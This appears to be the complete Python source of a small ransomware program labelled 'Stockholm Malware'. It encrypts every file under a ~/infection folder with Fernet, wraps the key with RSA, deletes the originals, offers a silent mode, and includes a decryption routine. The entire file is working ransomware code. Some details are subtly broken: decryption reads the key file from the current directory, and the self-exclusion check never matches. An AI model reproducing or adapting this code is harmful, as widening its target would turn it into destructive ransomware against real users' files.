import argparse
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

version = '1.0.0'
EXTENSION = '.ft'
HOMEDIR = os.path.expanduser("~")
TARGET = f"{HOMEDIR}/infection"
PROG = os.path.abspath(__file__)
IS_SILENT = False
PRI_PEM = os.path.join(HOMEDIR, "pri.pem")
KEY = os.path.join(HOMEDIR, "encrypted.key")

def parse_args():
    parser = argparse.ArgumentParser(description='Stockholm Malware')
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-r', type=str, help='Key to decrypt')
    group.add_argument('-v', version=f"stockholm version: {version}", action='version')
    parser.add_argument('-s', action="store_true",  help='Encrypt with silent mode')
    return parser.parse_args()

def decrypt(pri: str) -> None:
    '''
    @param key_file: key_file to decrypt
    '''
    try:
        key = rsa_decrypt(pri)
        fernet = Fernet(key)

        file_list = all_files_in_target()
        for file in file_list:
            # print(f"Decrypting file: {file}")

            # read the encrypt data
            with open(file, 'rb') as f:
                token = f.read()
            
            filename = os.path.basename(file)
            path = os.path.dirname(file)
            absolute_filename = os.path.join(path, filename[:-len(EXTENSION)])

            # decrypt the data
            decrypt = fernet.decrypt(token)

            # write the decrypted data
            with open(absolute_filename, 'wb') as f:
                f.write(decrypt)

            # remove the encrypted file
            os.remove(file)

            if not IS_SILENT:
                print(f"Decrypted file: {absolute_filename}")

        # remove the key file
        if os.path.exists(pri):
            os.remove(pri)
        if os.path.exists(PRI_PEM):
            os.remove(PRI_PEM)
        if os.path.exists(KEY):
            os.remove(KEY)
        
    except Exception as e:
        if not IS_SILENT:
            print(e)

def all_files_in_target(ext: bool = False) -> list:
    file_list = []
    for root, _, files in os.walk(TARGET):
        for file in files:
            absolute_path = os.path.join(root, file)
            if file == PROG:
                continue
            if os.path.isfile(absolute_path):
                if ext and not absolute_path.endswith(EXTENSION):
                    continue
                file_list.append(absolute_path)
    return file_list

def encrypt() -> None:
    # check if pri.pem exists
    pri = os.path.join(HOMEDIR, "pri.pem")
    if os.path.exists(pri):
        if not IS_SILENT:
            print("pri.pem exists")
        return

    # generate symmetric key
    key = Fernet.generate_key()
    # print(f"Key: {key}")

    # generate RSA key pair
    rsa_encrypt(key)
    
    file_list = all_files_in_target()

    for file in file_list:

        # print(f"Encrypting file: {file}")

        try:
            # read the data
            with open(file, 'rb') as f:
                data = f.read()

            filename = os.path.basename(file) + EXTENSION
            path = os.path.dirname(file)
            absolute_filename = os.path.join(path, filename)

            # encrypt the data
            fernet = Fernet(key).encrypt(data)

            # write the encrypted data
            with open(absolute_filename, 'wb') as f:
                f.write(fernet)
                if not IS_SILENT:
                    print(f"Encrypted file: {absolute_filename}")

            # remove the original file
            os.remove(file)
            
        except Exception as e:
            if not IS_SILENT:
                print(e)
            continue

def rsa_encrypt(symmetric_key: bytes) -> None:
    '''
    @param symmetric_key: symmetric key to encrypt
    '''
    try:
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )

        public_key = private_key.public_key()
        
        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        )
        
        with open(PRI_PEM, "wb") as f:
            f.write(private_pem)

        ciphertext = public_key.encrypt(
            symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        with open(KEY, "wb") as f:
            f.write(ciphertext)
    except Exception as e:
        if not IS_SILENT:
            print(e)
        exit(1)

def rsa_decrypt(pri: str) -> bytes:

    try:
        with open(pri, "rb") as f:
            private_key = serialization.load_pem_private_key(
                f.read(),
                password=None
            )

        with open("encrypted.key", "rb") as f:
            ciphertext = f.read()

        return private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        if not IS_SILENT:
            print(e)
        exit(1)

if __name__ == '__main__':

    args = parse_args()
    IS_SILENT = args.s
    if args.r:
        decrypt(args.r)
    else:
        encrypt()

   